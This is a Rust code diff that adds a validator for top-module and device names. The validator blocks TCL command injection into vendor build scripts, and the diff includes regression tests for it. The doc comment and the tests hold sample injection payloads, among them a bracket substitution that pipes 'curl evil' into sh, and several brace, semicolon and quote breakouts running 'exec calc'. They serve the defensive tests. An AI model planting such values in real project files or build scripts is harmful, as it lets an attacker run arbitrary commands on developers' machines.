@@ -43,6 +43,37 @@ pub fn to_tcl_path(path: &Path) -> String {
     }
 }
 
+/// Reject any value that isn't safe to interpolate verbatim into a generated
+/// TCL build script.
+///
+/// Backends build TCL by `format!`-interpolating `top_module`/`device`
+/// straight from the project's `.coverteda` config (untrusted input — the
+/// file can arrive via a cloned git repo, a shared project, or
+/// `import_vendor_project`) directly into commands like
+/// `synth_design -top {top_module}`. TCL performs command substitution on
+/// `[...]` even inside double-quoted strings, and unbalanced `{`/`}` breaks
+/// out of brace-quoting, so a value like `top[exec sh -c 'curl evil|sh']`
+/// would run arbitrary shell commands the moment the vendor tool parses the
+/// script. Every legitimate HDL top-module name and vendor device/part
+/// number is plain alphanumerics plus `_`/`-`/`.`, so an allowlist closes
+/// the injection regardless of how any individual backend happens to quote
+/// (or fails to quote) the value -- auditing every interpolation site
+/// across every backend for correct TCL quoting is exactly the kind of
+/// check that's easy to get right once and wrong the next time a backend
+/// is added.
+pub fn validate_tcl_safe_identifier(value: &str, field_name: &str) -> Result<(), String> {
+    if value.is_empty() {
+        return Err(format!("{field_name} must not be empty"));
+    }
+    if !value.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.')) {
+        return Err(format!(
+            "{field_name} \"{value}\" contains characters that are unsafe to pass to the vendor \
+             tool's TCL interpreter (only letters, digits, '_', '-', and '.' are allowed)"
+        ));
+    }
+    Ok(())
+}
+
 /// Parse package pins from a Lattice IBIS `.pkg` file's `[Pin Numbers]` section.
 /// This works for both Diamond and Radiant device families.
 ///
@@ -883,6 +914,61 @@ mod tests {
     fn test_registry_new_has_eight_backends() {
         let reg = BackendRegistry::new();
         assert_eq!(reg.list().len(), 8);
+    }
+
+    // ── Regression tests for #181 (CRITICAL): TCL injection via top_module/device ──
+
+    #[test]
+    fn test_validate_tcl_safe_identifier_accepts_real_world_values() {
+        // Realistic legitimate top_module/device values from example projects.
+        for v in [
+            "counter", "blinky", "pwm_gen", "top_module_2",
+            "xc7a100tcsg324-1", "5CSEMA5F31C6",
+            "LCMXO3LF-6900C-5BG256C", "LIFCL-40-7BG400I", "LFE5U-85F-6BG381C",
+        ] {
+            assert!(validate_tcl_safe_identifier(v, "field").is_ok(), "rejected legitimate value: {v}");
+        }
+    }
+
+    #[test]
+    fn test_validate_tcl_safe_identifier_rejects_empty() {
+        assert!(validate_tcl_safe_identifier("", "Top-level module").is_err());
+    }
+
+    #[test]
+    fn test_validate_tcl_safe_identifier_rejects_bracket_command_substitution() {
+        // The exact injection payload from #181: TCL performs command
+        // substitution on [...] even inside double-quoted strings.
+        let err = validate_tcl_safe_identifier(
+            "top[exec sh -c 'curl evil|sh']",
+            "Top-level module",
+        );
+        assert!(err.is_err());
+    }
+
+    #[test]
+    fn test_validate_tcl_safe_identifier_rejects_unbalanced_brace() {
+        // Unbalanced '}' breaks out of TCL's {...} brace-quoting, which
+        // several backends (libero.rs, radiant.rs) rely on.
+        assert!(validate_tcl_safe_identifier("top}; exec calc; #", "Device").is_err());
+    }
+
+    #[test]
+    fn test_validate_tcl_safe_identifier_rejects_quote_and_dollar() {
+        assert!(validate_tcl_safe_identifier(r#"top" exec calc "#, "Device").is_err());
+        assert!(validate_tcl_safe_identifier("$env(EVIL)", "Device").is_err());
+    }
+
+    #[test]
+    fn test_validate_tcl_safe_identifier_rejects_semicolon_and_whitespace() {
+        assert!(validate_tcl_safe_identifier("top; exec calc", "Device").is_err());
+        assert!(validate_tcl_safe_identifier("top module", "Device").is_err());
+    }
+
+    #[test]
+    fn test_validate_tcl_safe_identifier_error_mentions_field_name() {
+        let err = validate_tcl_safe_identifier("bad[x]", "Device").unwrap_err();
+        assert!(err.contains("Device"), "error should name the offending field: {err}");
     }
 
     #[test]
